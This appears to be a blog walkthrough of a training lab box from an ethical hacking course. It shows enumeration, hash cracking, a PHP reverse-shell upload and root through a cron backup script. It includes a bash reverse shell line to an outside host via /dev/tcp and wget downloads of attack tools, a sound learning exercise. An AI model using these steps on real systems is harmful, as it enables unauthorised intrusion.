---
title: "Rooting the Academy Box: A Practical Ethical Hacking Walkthrough"
layout: single
author_profile: true
date: 2024-03-19
toc: true
toc_label: "Table of Contents"
toc_sticky: true
categories:
  - Blog
tags:
  - Penetration Testing
  - Enumeration
  - Linux Privilege Escalation
  - Web App Security
tagline: "From Zero to Root: A Step-by-Step Guide to Compromising the Academy Box"
header:
  image: /assets/images/tcm-academy/academy-ctf-header.svg
  caption: "Navigating the Digital Labyrinth: A Journey Through Ethical Hacking"
  teaser: /assets/images/tcm-academy/academy-teaser.svg
  overlay_image: /assets/images/tcm-academy/academy-overlay-pattern.svg
  overlay_filter: rgba(0, 0, 0, 0.5)
---

# Rooting the Academy Box: A Practical Ethical Hacking Walkthrough

In this blog post, I'll walk you through the process of rooting the Academy box from the TCM Academy's Practical Ethical Hacker course. The box was designed to test your skills in directory busting, FTP exploration, PHP webshell uploads, and Linux privilege escalation.

## Attack Path Overview
1. Initial enumeration reveals FTP, HTTP, and SSH services
2. Anonymous FTP access provides crucial student registration information
3. Web application discovered with student portal login
4. File upload vulnerability in student profile section
5. Privilege escalation through periodic backup script

### Network Topology

```mermaid
graph TD
    A[Attacker Machine] -->|Port 21| B[Target: Academy Box]
    A -->|Port 80| B
    A -->|Port 22| B
    B -->|Web App| C[Student Portal]
    C -->|File Upload| D[PHP Shell]
    D -->|Privilege Escalation| E[Root Access]
```

## Initial Enumeration

Starting with a thorough nmap scan to identify open ports and services:

```bash
nmap -p- -A -T4 192.168.17.136 -oN map.txt
```

The scan revealed these services:
* FTP (21) - vsftp 3.0.3
* HTTP (80) - Apache httpd 2.4.38 (Debian)
* SSH (22) - OpenSSH 7.9p1

<img src="/assets/images/tcm-academy/academy-02.png">

From this, I identified two primary attack vectors to explore: the FTP service and the web server running on port 80.

## FTP Enumeration

I began by connecting to the FTP service using anonymous login:

```bash
ftp 192.168.17.136
ls
```

<img src="/assets/images/tcm-academy/academy-03.png">

Once connected, I discovered a file named note.txt. I downloaded and examined it:

```bash
get note.txt
cat note.txt
```

<img src="/assets/images/tcm-academy/academy-04.png">
<img src="/assets/images/tcm-academy/academy-05.png">

The note contained information about a student registration database and included a password hash. Using hash-identifier, I determined it was MD5:

```bash
hash-identifier 
```

<img src="/assets/images/tcm-academy/academy-06.png">

I saved the hash and used hashcat to crack it:

```bash
gedit hashes.txt
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt 
```

<img src="/assets/images/tcm-academy/academy-07.png">
<img src="/assets/images/tcm-academy/academy-08.png">

## Web Application Discovery

Initial web server check revealed a default Apache page. Moving to directory enumeration:

```bash
http://192.168.17.136/robots.txt
```

<img src="/assets/images/tcm-academy/academy-09-robots.png">

Checking page source:
```bash
right-click > view page source
```

<img src="/assets/images/tcm-academy/academy-09-page source.png">

I performed thorough directory enumeration:

```bash
dirb http://192.168.17.136
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u http://192.168.17.136/FUZZ
```

<img src="/assets/images/tcm-academy/academy-10.png">
<img src="/assets/images/tcm-academy/academy-11.png">

Two interesting paths were discovered:
- /phpmyadmin
- /academy

## Gaining Initial Access

Using the previously obtained credentials on the academy login page:

<img src="/assets/images/tcm-academy/academy-12.png">
<img src="/assets/images/tcm-academy/academy-12-student.png">

## Exploiting File Upload

Located a photo upload feature in the profile section:

<img src="/assets/images/tcm-academy/academy-13.png">

Testing confirmed uploads were stored at:
```bash
/academy/studentphoto/flower.jpg
```

<img src="/assets/images/tcm-academy/academy-14.png">

Preparing the PHP reverse shell:

```bash
nano reverse-shell.php
```

<img src="/assets/images/tcm-academy/academy-15.png">
<img src="/assets/images/tcm-academy/academy-16.png">

Setting up the listener:

```bash
nc -nvlp 1234
```

<img src="/assets/images/tcm-academy/academy-17.png">

Uploading and executing the shell:

<img src="/assets/images/tcm-academy/academy-18.png">
<img src="/assets/images/tcm-academy/academy-19.png">

## Privilege Escalation

Using LINPEAS for initial enumeration:

```bash
mkdir transfers
cd transfers
wget http://192.168.17.134/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

<img src="/assets/images/tcm-academy/academy-20.png">

LINPEAS revealed several interesting findings:
- A backup script in /home/grimmie
- MySQL credentials
- User "grimmie" with elevated privileges

<img src="/assets/images/tcm-academy/academy-23.png">
<img src="/assets/images/tcm-academy/academy-24.png">
<img src="/assets/images/tcm-academy/academy-25.png">
<img src="/assets/images/tcm-academy/academy-26.png">
<img src="/assets/images/tcm-academy/academy-27.png">

Using the discovered credentials for SSH access:

```bash
ssh grimmie@192.168.17.136
```

<img src="/assets/images/tcm-academy/academy-28.png">

Investigating user context:

```bash
sudo -l
history
cd /home/grimmie
ls
cat backup.sh
```

<img src="/assets/images/tcm-academy/academy-29.png">
<img src="/assets/images/tcm-academy/academy-30.png">

Using pspy to monitor processes:

```bash
wget http://192.168.17.134/pspy64
chmod +x pspy64
./pspy64
```

<img src="/assets/images/tcm-academy/academy-35.png">
<img src="/assets/images/tcm-academy/academy-36.png">
<img src="/assets/images/tcm-academy/academy-37.png">

## Root Access

Modifying backup.sh to include a reverse shell:

<img src="/assets/images/tcm-academy/academy-38.png">

```bash
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
```

<img src="/assets/images/tcm-academy/academy-39-1.png">
<img src="/assets/images/tcm-academy/academy-39-2.png">

Waiting for script execution to gain root:

<img src="/assets/images/tcm-academy/academy-40.png">

## Success - Root Access Achieved

```bash
whoami
cd /root
ls
cat flag.txt
```

<img src="/assets/images/tcm-academy/academy-41.png">

## Tools Used
- nmap: Network scanning
- dirb/ffuf: Directory enumeration
- hashcat: Password cracking
- netcat: Reverse shell listener
- LINPEAS: Privilege escalation enumeration
- pspy: Process monitoring


